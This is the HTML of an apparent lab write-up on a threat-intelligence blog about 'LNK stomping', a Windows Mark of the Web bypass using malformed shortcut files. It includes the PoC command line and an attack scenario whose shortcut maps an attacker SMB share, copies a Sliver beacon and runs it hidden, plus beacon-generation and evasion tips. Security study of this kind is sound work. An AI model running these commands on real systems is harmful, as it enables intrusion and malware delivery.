@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+      <title>
+        LNK Stomping ::
+        Axelarator — A CTI Analyst Blog
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta
+  name="description"
+  content="This PoC provided by Elastic is about LNK Stomping. Currently Microsoft has not provided a CVE for this method; however, they did release CVE-2024-38212, a MotW bypass vulnerability, but only included SmartScreen, not Smart App Control (SAC). As this testing is done on Windows 10 with build number 19045, I won&rsquo;t be dealing with SAC anyway. The PoC can bypass both.
+A quick primer on MotW from Elastic:
+"
+/>
+<meta
+  name="keywords"
+  content=""
+/>
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="http://localhost:1313/posts/lnkstomping/" />
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/style.css" />
+
+<link rel="stylesheet" href="http://localhost:1313/style.css" />
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="http://localhost:1313/img/apple-touch-icon-144-precomposed.png" />
+<link rel="shortcut icon" href="http://localhost:1313/img/favicon.png" />
+
+
+<link href="/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="LNK Stomping">
+  <meta name="twitter:description" content="This PoC provided by Elastic is about LNK Stomping. Currently Microsoft has not provided a CVE for this method; however, they did release CVE-2024-38212, a MotW bypass vulnerability, but only included SmartScreen, not Smart App Control (SAC). As this testing is done on Windows 10 with build number 19045, I won’t be dealing with SAC anyway. The PoC can bypass both.
+A quick primer on MotW from Elastic:">
+
+
+
+<meta property="og:url" content="http://localhost:1313/posts/lnkstomping/">
+  <meta property="og:site_name" content="Axelarator">
+  <meta property="og:title" content="LNK Stomping">
+  <meta property="og:description" content="This PoC provided by Elastic is about LNK Stomping. Currently Microsoft has not provided a CVE for this method; however, they did release CVE-2024-38212, a MotW bypass vulnerability, but only included SmartScreen, not Smart App Control (SAC). As this testing is done on Windows 10 with build number 19045, I won’t be dealing with SAC anyway. The PoC can bypass both.
+A quick primer on MotW from Elastic:">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-09-04T17:17:01-06:00">
+    <meta property="article:modified_time" content="2024-09-04T17:17:01-06:00">
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a
+  href="/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >Axelarator</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/projects">Projects</a></li>
+        
+      
+      
+      
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/projects">Projects</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none" />
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg
+  class="theme-toggler"
+  width="24"
+  height="24"
+  viewBox="0 0 48 48"
+  fill="none"
+  xmlns="http://www.w3.org/2000/svg"
+>
+  <path
+    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
+  />
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <article class="post">
+    <h1 class="post-title">LNK Stomping</h1>
+    <div class="post-meta">
+      
+        <time class="post-date">
+          2024-09-04
+        </time>
+
+        
+          
+        
+      
+
+      
+
+
+      
+    </div>
+
+    
+
+    
+
+    <div class="post-content">
+      
+      <p>This <a href="https://github.com/joe-desimone/rep-research">PoC provided by Elastic</a> is about LNK Stomping. Currently Microsoft has not provided a CVE for this method; however, they did release CVE-2024-38212, a MotW bypass vulnerability, but only included SmartScreen, not Smart App Control (SAC). As this testing is done on Windows 10 with build number 19045, I won&rsquo;t be dealing with SAC anyway. The PoC can bypass both.</p>
+<p>A quick primer on MotW from Elastic:</p>
+<blockquote>
+<p>When a user downloads a file, the browser will create an associated “Zone.Identifier” file in an <a href="https://www.digital-detective.net/forensic-analysis-of-zone-identifier-stream/">alternate data stream</a> (ADS) known as the Mark of the Web (MotW). This lets other software (including AV and EDR) on the system know that the file is more risky. SmartScreen only scans files with the Mark of the Web. SAC completely blocks certain file types if they have it. This makes MotW bypasses an interesting research target, as it can usually lead to bypassing these security systems. Financially motivated threat groups have discovered and leveraged <a href="https://blog.google/threat-analysis-group/magniber-ransomware-actors-used-a-variant-of-microsoft-smartscreen-bypass/">multiple vulnerabilities</a> to bypass MotW checks. These techniques involved appending crafted and invalid code signing signatures to javascript or MSI files.</p>
+</blockquote>
+<p>I explained what an ADS is in a previous post [[T1564 004]]</p>
+<blockquote>
+<p>A data stream that is alternate to the normal data stream. The data attribute (<code>$DATA</code>) is called the “normal” data stream or “unnamed” data stream since it can be left blank.
+- A normal data stream looks like <code>$DATA:&quot;&quot;</code>
+- An alternate data stream can be <code>$DATA:&quot;SecondStream&quot;</code></p>
+<ul>
+<li>To read what’s inside an ADS
+<ul>
+<li><code>Get-Item -path &lt;file&gt; -stream *</code></li>
+<li><code>Get-Content -path &lt;file&gt; -stream &lt;stream name&gt;</code></li>
+</ul>
+</li>
+<li>To add streams to a file
+<ul>
+<li><code>set-content -path &lt;path&gt; -stream &lt;stream name&gt;</code></li>
+</ul>
+</li>
+<li>To search for ADS
+<ul>
+<li><code>gci -recurse | % { gi $_.FullName - stream * } | where stream -ne ':$Data'</code></li>
+</ul>
+</li>
+<li>To remove ADS
+<ul>
+<li><code>remove-item -path &lt;path&gt; -stream &lt;stream name&gt;</code></li>
+</ul>
+</li>
+<li>A sysinternals tool called <code>streams.exe</code> can also enumerate streams
+<ul>
+<li><code>streams &lt;file path&gt;</code></li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<p>To provide a more visual explanation, taking the PoC GithHub repo above, you can view the data streams within the ZIP file (<code>Get-Item</code>) and view the contents to see where it came from (<code>Get-Content</code>). I downloaded the ZIP directly because cloning the repo only provides a <code>$DATA</code> stream. The Git client simply does not have a Zone.Identifier ADS which can also be treated as a way to bypass MotW.
+<img alt="1.png" src="/lnkstomping/1.png"></p>
+<p>What&rsquo;s interesting from the first screenshot is the inclusion of a SmartScreen data stream. This is a stream that provides an additional hook into the registered AV engine.</p>
+<p><img alt="3.png" src="/lnkstomping/3.png"></p>
+<p>SysInternals also includes a tool if that command is too annoying to type out. The caveat being you can&rsquo;t view the content.
+<a href="https://learn.microsoft.com/en-us/sysinternals/downloads/streams">https://learn.microsoft.com/en-us/sysinternals/downloads/streams</a></p>
+<p><img alt="4.png" src="/lnkstomping/4.png"></p>
+<p>Now rather than just using a different file type like an ISO embedded within a ZIP archive, something <a href="https://www.trendmicro.com/en_us/research/22/j/black-basta-infiltrates-networks-via-qakbot-brute-ratel-and-coba.html">Black Basta</a> and numerous other threat actors have done in the past, Elastic uncovered another trivial way of evading MotW by using LNK files with non-standard target paths or internal structures. When the file is clicked, <code>explorer.exe</code> modifies the file with canonical formatting, removing the MotW label.
+In this example, I used the dot variant which appends a dot after the PowerShell executable so it looks like <code>~\powershell.exe.</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python lnk_stomping<span style="color:#f92672">.</span>py <span style="color:#f92672">--</span>executable c:\windows\system32\WindowsPowerShell\v1<span style="color:#ae81ff">.0</span>\powershell<span style="color:#f92672">.</span>exe <span style="color:#f92672">--</span>arguments <span style="color:#e6db74">&#34;-c calc&#34;</span> <span style="color:#f92672">--</span>icon folder <span style="color:#f92672">--</span>variant dot <span style="color:#f92672">--</span>output totally_legit<span style="color:#f92672">.</span>lnk
+</span></span></code></pre></div><p>The <code>--icon</code> argument argument can either make the LNK file to appear as a folder or pdf icon. An <a href="https://attack.mitre.org/techniques/T1027/012/">obfuscation method</a> threat actors use to make their files appear legit.</p>
+<p><img alt="5.png" src="/lnkstomping/5.png"></p>
+<p>Using Eric Zimmerman&rsquo;s tool LECMD, the path with the dot operator can be seen
+<img alt="6.png" src="/lnkstomping/6.png"></p>
+<p>Since all of this was done locally, testing if it evades MotW won&rsquo;t work since it was never applied in the first place. Instead, I hosted this file elsewhere and download it to my Windows system and you can see below the Zone.Identifier stream attached. If you&rsquo;re wondering why the filename changed, the GitHub repo hosts sample files already configured with dot, path segment, and relative variants. Each of them can be recreated anyway using the Python script and supplying the appropriate variant you want to test.</p>
+<p><img alt="7.png" src="/lnkstomping/7.png"></p>
+<p>Following execution with a successful <code>calc.exe</code> process opened, the stream is gone!
+<img alt="8.png" src="/lnkstomping/8.png"></p>
+<p>Viewing the LNK via LECMD again confirms Windows Explorer did indeed modify the file to fix the trailing dot.
+<img alt="9.png" src="/lnkstomping/9.png"></p>
+<h3 id="attack-scenario">
+  Attack Scenario
+  <a href="#attack-scenario" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>To put a little more effort into this, I modified the arguments to download a remote file and execute it to gain a Sliver beacon. I&rsquo;m not trying to win any awards for defense evasion or command obfuscation but you could simplify this a bit with <code>psexec</code>. However, since <code>psexec</code> is a part of the Sysinternals suite, it would rely on the victim already having it installed which in this case isn&rsquo;t realistic.</p>
+<p><code>-c net use \\192.168.98.108\kalishare /USER:anon anon; copy \\192.168.98.108\kalishare\READY_CANAL.exe; powershell.exe -WindowStyle hidden .\READY_CANAL.exe&quot; --icon pdf --variant dot --output sliver.lnk</code></p>
+<p>The command starts by connecting to an SMB share running on the attacker system with credentials anon:anon.</p>
+<p><img alt="10.png" src="/lnkstomping/10.png"></p>
+<p>Next, it copies the Sliver beacon to the victim&rsquo;s current working directory. But in order to copy a beacon, one has to be created first. Within the sliver terminal:</p>
+<p><code>generate beacon -b 192.168.98.108 --skip-symbols --debug -j 5 -S 15 --os windows</code></p>
+<p>Without providing a name, it will create a randomly generated one which in this case is <code>ROYAL_CANAL.exe</code>. Better opsec would be to rename this as a process already present on Windows, like <code>svchost.exe</code>. It won&rsquo;t totally evade detection as Sliver is very well known and Windows Defender signatures will flag and purge this instantly, but it&rsquo;s a start. Next steps would be to implement something like <a href="https://iwantmore.pizza/posts/PEzor.html">PEzore</a></p>
+<p>So with a beacon payload generated and an SMB share running, the last step is to start an HTTPS listener so the beacon has something to connect back to.</p>
+<p><img alt="11.png" src="/lnkstomping/11.png"></p>
+<p>Everything&rsquo;s ready so it&rsquo;s time to execute! Following execution, Sliver got a callback.
+<img alt="12.png" src="/lnkstomping/12.png"></p>
+<p>From here, it&rsquo;s up to the features of Sliver and any additional tools within the Armory to carry out further attacks. If noise is what you&rsquo;re after, you could run <code>seatbelt -i -- -group=system</code> to dump everything about the current system. Mainly Event ID&rsquo;s 4798 (group-membership-enumerated) and 4799 (user-member-enumerated).
+Since this is an HTTPS beacon, you&rsquo;ll see a lot of Sysmon event ID 3 ( Network connection detected) logs too for each task and check-in.</p>
+<p>For this lab, the user account is vulnerable by default and a part of the Administrators group so owning the system is quite easy.</p>
+<p><img alt="13.png" src="/lnkstomping/13.png"></p>
+<h3 id="references">
+  References
+  <a href="#references" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p><a href="https://www.elastic.co/security-labs/dismantling-smart-app-control">https://www.elastic.co/security-labs/dismantling-smart-app-control</a>
+<a href="https://github.com/joe-desimone/rep-research">https://github.com/joe-desimone/rep-research</a>
+<a href="https://redcanary.com/threat-detection-report/techniques/mark-of-the-web-bypass/">https://redcanary.com/threat-detection-report/techniques/mark-of-the-web-bypass/</a>
+<a href="https://unprotect.it/technique/mark-of-the-web-motw-bypass/">https://unprotect.it/technique/mark-of-the-web-motw-bypass/</a></p>
+
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h"
+              >Read other posts</span
+            >
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+            
+              <span class="button next">
+                <a href="http://localhost:1313/posts/cti/">
+                  <span class="button__text">The A in CTI Stands for Actionable</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+    
+      
+        
+
+      
+    
+  </article>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a
+  href="/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >Axelarator</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        <span>© 2024 Powered by <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
+        <span><a href="https://github.com/panr/hugo-theme-hello-friend" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+    
+  </div>
+</footer>
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
